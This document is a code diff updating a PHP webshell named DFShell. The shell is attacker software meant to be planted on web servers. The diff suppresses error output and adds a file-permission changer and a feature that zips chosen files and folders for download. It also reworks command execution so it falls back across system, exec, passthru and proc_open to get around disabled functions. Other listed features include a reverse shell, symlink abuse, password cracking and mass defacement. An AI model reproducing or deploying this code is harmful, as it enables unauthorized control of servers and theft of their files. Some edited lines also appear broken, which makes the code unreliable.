@@ -1,16 +1,14 @@
 <?php
 
-namespace DFM;
-
-#ini_set('display_errors', 0);
-#ini_set('display_startup_errors', 0);
-#error_reporting(0);
+ini_set('display_errors', 0);
+ini_set('display_startup_errors', 0);
+error_reporting(0);
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 #                                                                               #
 #           This webshell are programmed and modified by Eagle Eye              #
 #                   Github : https://github.com/EagleTube                       #
 #               Youtube : https://www.youtube.com/c/EagleTube1337               #
-#                  Do not self claim or claiming this webshell                  #
+#          Referred : ivan-sincek(revershell) | 0x5a455553(PermChg)             #
 #                                                                               #
 # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
 
@@ -21,9 +19,9 @@ $DFShell_Ver = 1.0;
 $DFConfig = array($_REQUEST,$_POST,$_SERVER,$_COOKIE,$_FILES);
 $DFSyntax = array("file_get_contents","fileperms","readfile","chdir","getcwd","function_exists","fsockopen","pcntl_fork",
 "stream_set_blocking","proc_get_status","proc_open","proc_close","posix_setsid","stream_select","stream_get_contents"); // $GLOBALS['DFSyntax']
-$DFSCmd = array("system","shell_exec","exec","passthru","proc_open");
+$DFSCmd = array("shell_exec","system","exec","passthru","proc_open");
 $DFSPlatform = strtolower(substr(PHP_OS,0,3));
-$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren");
+$DFSOptions = array("edit","cmd","del","sql","conf","sym","reverse","crack","mass","logout","dest","ren","chmd");
 
 #new update will use chdir(); function
 #readlink("symlink_file"),lchgrp(symlink_file, uid),lchown(symlink_file, 8) function
@@ -301,8 +299,7 @@ class DFShell{
     }
 
 
-####### REVERSHELL ########
-
+####### END REVERSHELL ########
 
     public function DFSAction($action){
         switch(strtolower($action)){
@@ -319,6 +316,76 @@ class DFShell{
                     $GLOBALS['DFSyntax'][2]($pathfile);
                 }else{
                     echo "<script>alert('File not found!');</script>";
+                }
+            break;
+            case "chmd":
+                $slashtype = $this->DFSSlash();
+                $this->DFSCurrent($slashtype);
+                if(isset($this->query)){
+                    $dirmod = $this->Dec($this->query[0]);
+                    $filmod = "";
+                    if(isset($this->query[1])){
+                        $filmod = $this->Dec($this->query[1]);
+                    }
+                    $_cmod = $this->DFSMod(fileperms($dirmod . $filmod));
+                    echo "<section class='modarea'><p><font color='white'>Location : </font><font color='#FFD700'>$dirmod$filmod</font></p>";
+                    echo "<form action='' method='POST' autocomplete='OFF'>
+                    <input type='text' name='modf' placeholder='$_cmod'>
+                    <input type='submit' name='cmod' value='Chmod'>
+                    </form></section>
+                    ";
+                    if(isset($GLOBALS['DFConfig'][1]['cmod'])){
+                        if($this->DFSChange($dirmod . $filmod,$GLOBALS['DFConfig'][1]['modf'])){
+                            echo "<script>alert('Successfully changed!');</script>";
+                        }else{
+                            echo "<script>alert('An error occured!');</script>";
+                        }
+                    }
+                }
+            break;
+            case "zipping":
+                $ziproc = new ZipArchive;
+                $slashtype = $this->DFSSlash();
+                if(isset($GLOBALS['DFConfig'][1]['zipfile'])){
+                    if(empty($GLOBALS['DFConfig'][1]['toZip'])){
+                        print("<script>alert('You have to pick a file');</script>");
+                    }else{
+                        $toZip = $GLOBALS['DFConfig'][1]['toZip'];
+                        $zipXname = md5(time()) . ".zip";
+                        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
+                            $zipdirname = $this->Dec($GLOBALS['DFConfig'][0]['dfp']) . $slashtype . $zipXname;
+                        }else{
+                            $zipdirname = $zipXname;
+                        }
+                        if($ziproc -> open($zipdirname, ZipArchive::CREATE | ZipArchive::OVERWRITE)){
+                            for($i=0;$i<count($toZip);$i++){
+                                $mzip = explode("||",$toZip[$i]);
+                                if(($mzip[1])==="[novalue]"){
+                                    $dirtozip = $this->Dec(urldecode($mzip[0])) . $slashtype;
+                                    $recdir = new RecursiveIteratorIterator(
+                                        new RecursiveDirectoryIterator($dirtozip),
+                                        RecursiveIteratorIterator::LEAVES_ONLY
+                                    );
+                                    foreach ($recdir as $name => $file)
+                                    {
+                                        if (!$file->isDir())
+                                        {
+                                            $filePath = $file->getRealPath();
+                                            $relativePath = substr($filePath, strlen($dirtozip));
+                                            $ziproc->addFile($filePath, $relativePath);
+                                        }
+                                    }
+
+                                }else{
+                                    $filetozip = $this->Dec(urldecode($mzip[0])) . $slashtype . $this->Dec(urldecode($mzip[1]));
+                                    $ziproc->addFile($filetozip,$this->Dec(urldecode($mzip[1])));
+                                }
+                            }
+                            echo "<script>alert('saved as $zipXname');window.location.replace(window.location.href);</script>";
+                            $ziproc ->close();
+                        }
+
+                    }
                 }
             break;
             case "upload":
@@ -411,18 +478,12 @@ class DFShell{
                 }
             break;
             case "cmd":
-
-                if(isset($GLOBALS['DFConfig'][0]['dfp'])){
-                    $GLOBALS['DFSyntax'][3]($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
-                }else{
-                    $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
-                }
-                
+                $slashtype = $this->DFSSlash();
+                $this->DFSCurrent($slashtype);
                 echo "<section id='cmd_area'>";
                 echo "<form action='' method='POST' autocomplete='OFF'><textarea class='cmd_response' readonly='TRUE'>";
                 if(isset($GLOBALS['DFConfig'][1]['dfscmd']) && !empty($GLOBALS['DFConfig'][1]['dfscmd'])){
                    $this->DFSExecute($GLOBALS['DFConfig'][1]['dfscmd']);
-             
                 }
                 echo "</textarea><br><input type='text' name='dfscmd' placeholder='whoami'><br><button>Execute</button></form>";
                 echo "</section>";
@@ -455,7 +516,7 @@ class DFShell{
                                     fclose($user_ht);
 
                                     $dfsv = preg_replace("/".urlencode($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']."/")."/i","",urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']));
-                                    print("Done! -> ".$nothing['name']." -> <a href='/".urldecode($dfsv)."'>Open</a><br>");
+                                    print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
                                 }else{
                                     $targetpath = $this->DFSRender('/%{user}%/i',$nothing['name'],$GLOBALS['DFConfig'][1]['target']);
 
@@ -467,7 +528,7 @@ class DFShell{
                                     fclose($user_ht);
 
                                     $dfsv = preg_replace("/".urlencode($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']."/")."/i","",urlencode($GLOBALS['DFConfig'][1]['path'].'/sym/'.$nothing['name'].'/'.$GLOBALS['DFConfig'][1]['dfsaved']));
-                                    print("Done! -> ".$nothing['name']." -> <a href='/".urldecode($dfsv)."'>Open</a><br>");
+                                    print("Done! -> ".$nothing['name']." -> <a href='".urldecode($dfsv)."'>Open</a><br>");
                                 }
                             }
                         }
@@ -516,8 +577,8 @@ class DFShell{
                 $path = $this->Dec(($this->query[0])). $slashtype;
                 $path = $this->Dec($this->DFSDirFilter($path));
                 $this->DFSCurrent($slashtype);
-                echo "<div class='directory'>";
-                echo "<table><th>Type</th><th>Name</th><th>Size</th><th>Owner:Groups</th><th>Perms</th><th>Modified</th><th>Action</th>";
+                echo "<div class='directory'><form action='' method='POST'>";
+                echo "<table><th>Pick</th><th>Type</th><th>Name</th><th>Size</th><th>Owner:Groups</th><th>Perms</th><th>Modified</th><th>Action</th>";
                 $folder = array_diff(scandir($path),['.','..']);
                 $files = scandir($path);
 
@@ -529,10 +590,11 @@ class DFShell{
                         $uid = explode(':',$this->DFSOG($filtered.$slashtype.$p));
                         //$og = posix_getpwuid($uid[0]);
 
-                        echo "<p><tr><td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?dfp=".urlencode($this->Enc())."'>$p</a></td>";
+                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($this->Enc())."||[novalue]'></td></td>";
+                        echo "<td id='iconx'><i class='fa-regular fa-folder'></i></td><td id='tbname'><a href='?dfp=".urlencode($this->Enc())."'>$p</a></td>";
                         echo "<td></td>";
                         echo "<td id='tbcen'>".$this->DFSOG($filtered . $slashtype . $p)."</td>";
-                        echo "<td id='tbcen'>".$this->DFSPerms($filtered . $slashtype . $p)."</td>";
+                        echo "<td id='tbcen'><a href='?dfp=".urlencode($this->Enc())."&dfaction=chmd'>".$this->DFSPerms($filtered . $slashtype . $p)."</a></td>";
                         echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered . $slashtype . $p))."</td>";
                         echo "<td id='tbcen'> <a href='?dfp=".urlencode($this->Enc())."&dfaction=ren'><i class='fa-solid fa-pen'></i></a>. 
                         <a href='?dfp=".urlencode($this->Enc())."&dfaction=del'><i class='fa-solid fa-trash'></i></a></td></tr></p>";
@@ -546,10 +608,11 @@ class DFShell{
                         $dfp = $this->Enc();
                         $this->string = $p;
                         $dff = $this->Enc();
-                        echo "<p><tr><td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$p</a></td>";
+                        echo "<p><tr><td id='fchecks'><input type='checkbox' name='toZip[]' value='".urlencode($dfp)."||".urlencode($dff)."'></td></td>";
+                        echo "<td id='iconx'><i class='fa-solid fa-file'></i></td><td id='tbname'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."'>$p</a></td>";
                         echo "<td>".$this->DFSFormat(filesize($filtered.$p))."</td>";
                         echo "<td id='tbcen'>".$this->DFSOG($filtered.$p)."</td>";
-                        echo "<td id='tbcen'>".$this->DFSPerms($filtered.$p)."</td>";
+                        echo "<td id='tbcen'><a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=chmd'>".$this->DFSPerms($filtered.$p)."</a></td>";
                         echo "<td id='tbcen' class='tbdate'>".date("h:i:sA(d/m/Y)",filemtime($filtered.$p))."</td>";
                         echo "<td id='tbcen'>
                         <a href='?dfp=".urlencode($dfp)."&dff=".urlencode($dff)."&dfaction=edit'><i class='fa-solid fa-file-signature'></i></a> . 
@@ -558,7 +621,7 @@ class DFShell{
                         <a href='?dfp=".urlencode($dfp)."&dfd=".urlencode($dff)."&dfaction=download'><i class='fa-solid fa-download'></i></a></td></tr></p>";
                     }
                 }
-                echo "</table></div>";
+                echo "</table><div id='anact'><input type='submit' name='zipfile' value='Zip'></div></form></div>";
 
             break;
             case "del":
@@ -803,6 +866,11 @@ class DFShell{
     }
 
     public function DFSExecute($command){
+        if(isset($GLOBALS['DFConfig'][0]['dfp'])){
+            $GLOBALS['DFSyntax'][3]($this->Dec($GLOBALS['DFConfig'][0]['dfp']));
+        }else{
+            $GLOBALS['DFSyntax'][3]($GLOBALS['DFConfig'][2]['DOCUMENT_ROOT']);
+        }
         if($this->DFSDat('ini','disable_functions')!=="None"){
             $disCMD = explode(",",$this->DFSDat('ini','disable_functions'));
             foreach($GLOBALS['DFSCmd'] as $cmd){
@@ -814,10 +882,10 @@ class DFShell{
             if($availCMD===$GLOBALS['DFSCmd'][4]){
                 return $this->DFSProcOpen($command);
             }else{
-                return $availCMD($command);
+                return $availCMD;
             }
         }else{
-            return $GLOBALS['DFSCmd'][0]($command);
+            system($command);
         }
     }
 
@@ -914,19 +982,28 @@ class DFShell{
         
         $dfsEP = explode($slashtype,$path);
         $dfsSZ = sizeof(($dfsEP));
-        $dfsGE = ""; 
+        $dfsGE = "";
         for($c=0;$c<$dfsSZ;$c++){
-            if($dfsEP[$c]!=""){
-                array_push($truepath,$dfsEP[$c]);
-            }
+            array_push($truepath,$dfsEP[$c]);
         }
+        if($GLOBALS['DFSPlatform']!=='win'){
+            $endslash = $this->DFSDirFilter($slashtype);
+            echo "<a href='?dfp=".urlencode($endslash)."'>$slashtype</a>";
+        }
+        for($i=0;$i<sizeof($truepath);$i++){
+            if(!empty($dfsEP[$i]) || !$dfsEP[$i]==""){
+                if($GLOBALS['DFSPlatform']!=='win'){
+                    $dfsGE .=  $slashtype . $dfsEP[$i];
+                }else{
+                    $dfsGE .= $dfsEP[$i] . $slashtype ;
+                }
+                
+                $dfsGEn = $this->DFSDirFilter($dfsGE);
+                //$this->string = preg_replace('/'.$slashtype.$slashtype.'/i',$slashtype,$dfsGE);
+                echo "<a href='?dfp=".urlencode($dfsGEn)."'>$dfsEP[$i]</a>";
+                echo $slashtype;
+            }
 
-        for($i=0;$i<=sizeof($truepath);$i++){
-            $dfsGE .=  $dfsEP[$i] . $slashtype;
-            $dfsGEn = $this->DFSDirFilter($dfsGE);
-            //$this->string = preg_replace('/'.$slashtype.$slashtype.'/i',$slashtype,$dfsGE);
-            echo "<a href='?dfp=".urlencode($dfsGEn)."'>$dfsEP[$i]</a>";
-            echo $slashtype;
         }
         
         echo "</div>";
@@ -936,7 +1013,16 @@ class DFShell{
         if($GLOBALS['DFSPlatform']!=='win'){
             $owner_file = (fileowner($file)?:0);
             $group_file = (filegroup($file)?:0);
-            $owner_group = posix_getpwuid($owner_file)['name'] . ':' . posix_getpwuid($group_file)['name'];
+            $checkposix = $this->DFSDat('ini','disable_functions');
+            if($checkposix !=="None"){
+                $checkposix = explode(",",$checkposix);
+                if(!in_array("posix_getpwuid",$checkposix)){
+                    $owner_group = posix_getpwuid($owner_file)['name'] . ':' . posix_getpwuid($group_file)['name'];
+                }else{
+                    $owner_group = "-:-";
+                }
+            }
+            
         }else{
             $owner_group = "-:-";
         }
@@ -974,6 +1060,10 @@ class DFShell{
         return $i;
     }
 
+    private function DFSMod($code){
+        return substr(sprintf("%o",$code),-4);
+    }
+
     public function DFSChange($loc,$code){
         $def = 0;
         for($i=strlen($code)-1;$i>=0;--$i)
@@ -981,10 +1071,11 @@ class DFShell{
         if(is_dir($loc) || is_file($loc)){
             if(chmod($loc,$def)){
                 return true;
+            }else{
+                return false;
             }
         }
     }
-
 
     public function DFSDat($ch,$value){
         switch(strtolower($ch)){
@@ -1124,7 +1215,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
         $chead = $shell->DFSInfo();
         
        if(isset($DFConfig[0]['dfp'])){
-           $cmdx = "?dfp=".$DFConfig[0]['dfp']."&dfaction=cmd";
+           $cmdx = "?dfp=".urlencode($DFConfig[0]['dfp'])."&dfaction=cmd";
        }else{
         $cmdx = "?dfaction=cmd";
        }
@@ -1183,6 +1274,7 @@ if(!isset($_SESSION['DFS_Auth']) || empty($_SESSION['DFS_Auth'])){
             $shell->string = $DFConfig[1]['encstr'];
             $shell->DFSPopupMSG(1,"Encryption for ".$DFConfig[1]['encstr'],$shell->Enc(),"So you can change password",true);
         }
+        $shell->DFSAction("zipping");
         $footer = $shell->DFSEnd();
         print($footer);
     }
